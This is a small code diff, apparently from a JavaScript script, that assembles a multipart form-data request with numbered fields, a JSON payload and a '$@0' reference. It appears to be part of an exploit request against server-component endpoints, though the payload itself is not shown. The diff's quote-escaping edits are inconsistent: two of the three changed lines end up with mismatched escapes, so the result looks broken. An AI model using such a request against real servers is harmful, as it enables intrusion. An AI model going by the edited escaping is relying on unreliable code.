@@ -87,15 +87,15 @@ const payload = JSON.stringify({\n\
 const boundary = "----WebKitFormBoundarysubmission";\n\
 const body = [\n\
   `--${boundary}`,\n\
-  "Content-Disposition: form-data; name=\\\"0\\\"",\n\
+  "Content-Disposition: form-data; name=\\"0\\"",\n\
   "",\n\
   payload,\n\
   `--${boundary}`,\n\
-  "Content-Disposition: form-data; name=\\\"1\\\"",\n\
+  "Content-Disposition: form-data; name=\\"1\\\"",\n\
   "",\n\
   "\\\"$@0\\\"",\n\
   `--${boundary}`,\n\
-  "Content-Disposition: form-data; name=\\\"2\\\"",\n\
+  "Content-Disposition: form-data; name=\\"2\\\"",\n\
   "",\n\
   "[]",\n\
   `--${boundary}--`,\n\
